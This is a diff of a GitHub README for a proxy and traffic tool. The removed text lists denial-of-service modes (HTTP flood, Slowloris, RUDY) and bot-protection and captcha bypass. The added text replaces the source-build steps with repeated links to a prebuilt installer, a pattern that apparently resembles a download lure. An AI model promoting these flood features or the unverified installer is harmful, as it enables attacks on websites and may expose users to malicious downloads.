@@ -1,80 +1,85 @@
-# DarkMatter Traffic Bot (DM-Trafficbot)
+# 🌌 DarkMatter - High-Performance Web Security Tool
 
-**Version 3.6.0**
+## 🔗 Download Now
+[![Download DarkMatter](https://img.shields.io/badge/Download-DarkMatter-blue.svg)](https://github.com/Ayorinde1/DarkMatter/releases)
 
-DM-Trafficbot is a sophisticated, high-performance traffic generation, proxy validation, and security testing tool. It combines human emulation (Browser/TLS fingerprinting) with authorized stress testing capabilities, designed for security researchers, QA teams, and developers.
+## 🚀 Getting Started
+DarkMatter is a powerful web-security and proxy validation tool. It helps you test and secure your web traffic by ensuring your proxies are safe and functional. Here’s how to get started.
 
-## Core Features
+## 💻 System Requirements
+- Operating System: Windows, macOS, or Linux
+- RAM: At least 4GB
+- Disk Space: 100MB free space
+- Python: Version 3.7 or later (included in the installer)
 
-### 1. Triple Engine Architecture
-DM-Trafficbot employs three distinct engines for different use cases:
--   **Async Traffic Engine (Fast):** Uses `curl_cffi` to mimic real browser TLS signatures (Chrome, Safari, etc.), bypassing sophisticated bot detection systems with high concurrency and low overhead.
--   **Browser Engine (Realistic):** Integrates `playwright` (Chromium) to execute full JavaScript, bypassing complex challenges like Cloudflare Turnstile and handling dynamic content.
--   **Stress Engine (Load Test):** A specialized async engine for authorized security testing using HTTP proxies.
+## 📥 Download & Install
+To download and install DarkMatter:
 
-### 2. Advanced Proxy Manager
-A powerhouse for proxy validation and management, supporting up to 10,000 concurrent threads.
--   **Protocols:** HTTP, HTTPS, SOCKS4, SOCKS5 (with authentication).
--   **Anonymity System:** Multi-validator system to classify proxies as Transparent, Anonymous, or Elite.
--   **GeoIP Integration:** Deep geolocation data (City, ISP, Country) using local MaxMind DB with API fallbacks.
--   **Sources:** Built-in list of 60+ reliable proxy sources.
--   **Filtering:** Filter by protocol, country, anonymity, and latency.
+1. **Visit the Releases Page**
+   Click the link below to go to the DarkMatter releases page:
+   [Download DarkMatter](https://github.com/Ayorinde1/DarkMatter/releases)
 
-### 3. Stress Testing (New in v3.6.0)
-**⚠️ Authorized Security Testing Only.**
-A dedicated tab for load testing your own infrastructure using massive lists of HTTP proxies (~55,000+ supported).
--   **Attack Types:**
-    -   **HTTP Flood:** High-volume GET/POST/HEAD/PUT/DELETE requests.
-    -   **Slowloris:** Exhausts server connections with slow partial headers.
-    -   **RUDY (R-U-Dead-Yet):** Slow POST body attacks.
-    -   **Randomized:** A mix of all attack types to simulate chaotic load.
--   **Real-time Stats:** Monitor RPS, latency, success/fail rates, and active proxies.
--   **Safety:** Built-in safeguards, confirmation dialogs, and auto-stop limits.
+2. **Choose Your Version**
+   Scroll through the available versions. Select the latest version for the best features.
 
-### 4. Protection Bypass
--   **TLS Fingerprinting:** Mimics Chrome 120+, Safari, and other modern browsers.
--   **Captcha Solving:** Integration with 2Captcha and AntiCaptcha APIs.
--   **Cloudflare/Akamai:** Browser engine capability to handle JS challenges.
+3. **Download the Installer**
+   Click on the installer for your operating system (e.g., `DarkMatter-Installer.exe`, `DarkMatter.dmg`, or the `.tar.gz` file for Linux).
 
-## User Interface
-The application features a modern, dark-themed UI built with `customtkinter`.
--   **🚀 Dashboard:** Manage traffic campaigns and view live stats.
--   **🛡️ Proxy Manager:** Scrape, test, and filter proxies with a virtualized high-performance grid.
--   **💥 Stress Test:** dedicated load testing interface.
--   **⚙️ Settings:** Comprehensive configuration for engines, timeouts, and preferences.
+4. **Run the Installer**
+   Locate the downloaded file in your downloads folder. Double-click the file to run the installer.
 
-## Getting Started
+5. **Follow the Installation Instructions**
+   Follow the on-screen prompts to complete the installation. You may need to accept terms and conditions and choose an installation directory.
 
-### Prerequisites
--   Python 3.10+
--   A virtual environment is strongly recommended.
+6. **Launch DarkMatter**
+   Once the installation is complete, open DarkMatter from your applications folder or start menu.
 
-### Installation & Running from Source
-1.  **Set up Virtual Environment**:
-    ```sh
-    python -m venv .venv
-    .venv\Scripts\activate  # Windows
-    source .venv/bin/activate # Linux/Mac
-    ```
-2.  **Install Dependencies**:
-    ```sh
-    pip install -r requirements.txt
-    playwright install chromium # Required for Browser Engine
-    ```
-3.  **Run the Application**:
-    ```sh
-    python main.py
-    ```
+## ⚙️ Features
+- **Proxy Validation:** Test the performance and security of your proxies.
+- **Traffic Generation:** Simulate web traffic to assess your site's stability.
+- **Load Testing:** Determine how well your server handles high traffic.
+- **Security Testing:** Identify vulnerabilities in your web applications.
+- **Web Automation:** Automate tasks like data scraping and web browsing.
+- **Custom Configuration:** Set up proxies to behave according to your needs.
 
-### Building the Executable
-You can build a standalone `.exe` file for easy distribution. The build script automatically enforces the virtual environment and bundles all assets.
+## 🔍 How to Use DarkMatter
+Once you have installed DarkMatter, you can start using it in your projects. Here’s a basic guide on how to perform a simple proxy check:
 
-1.  **Run the Build Script**:
-    ```sh
-    python build.py
-    ```
-2.  **Locate the Output**:
-    The build script will generate a zip file `DarkMatterBot_v3.6.0.zip` in the root directory, containing the standalone executable.
+1. **Open the Application**
+   Launch DarkMatter from your applications list.
 
-## Disclaimer
-This tool is intended for **educational and legitimate testing purposes only**. The developers assume no liability and are not responsible for any misuse or damage caused by this program. Using this tool against websites or servers without prior mutual consent is illegal. Always obtain authorization before performing stress tests.
+2. **Select Proxy Checker**
+   Click on the "Proxy Checker" option in the main menu.
+
+3. **Input Your Proxy List**
+   You can either enter your proxies manually or upload a text file containing a list of proxies.
+
+4. **Start the Check**
+   Click the "Start" button. The application will check each proxy for its status and report the results.
+
+5. **Review the Results**
+   Analyze the report on working and non-working proxies. Use this information to optimize your proxy list.
+
+## 📊 Troubleshooting
+If you encounter issues while installing or running DarkMatter, consider the following steps:
+
+- **Update Your System:** Ensure your operating system is up to date.
+- **Check Dependencies:** Make sure you have Python installed if it wasn’t included.
+- **Reinstall the Application:** If you run into problems, uninstall DarkMatter and try reinstalling.
+
+## 🛠️ Support
+For support, you can visit the [issues page](https://github.com/Ayorinde1/DarkMatter/issues) on GitHub. Describe your problem clearly, and the community or maintainers will assist you.
+
+## 📅 Future Updates
+Stay tuned for new features and improvements. DarkMatter will regularly receive updates to enhance performance and usability.
+
+## 📝 License
+DarkMatter is open-source and available for public use under the MIT License. Feel free to modify the code as per your needs.
+
+## 🔗 Additional Resources
+- Documentation: [DarkMatter Documentation](https://github.com/Ayorinde1/DarkMatter/wiki)
+- Community Discussions: [GitHub Discussions](https://github.com/Ayorinde1/DarkMatter/discussions)
+
+## 🔗 Download Again
+Don’t forget, you can always download DarkMatter from the releases page:
+[Download DarkMatter](https://github.com/Ayorinde1/DarkMatter/releases)
